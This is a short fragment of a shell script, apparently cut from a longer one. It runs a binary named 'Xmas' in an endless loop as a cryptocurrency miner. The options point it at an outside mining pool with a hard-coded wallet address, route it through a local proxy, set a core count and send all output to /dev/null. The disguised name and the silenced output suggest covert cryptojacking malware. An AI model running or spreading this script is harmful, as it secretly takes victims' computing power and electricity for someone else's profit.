...
while true
do
./Xmas --donate-level 1 -o fastxyz.teatspray.uk:6360 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K@$currentdate --rig-id=$currentdate -p $currentdate -a rx/arq -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
sleep 10
done
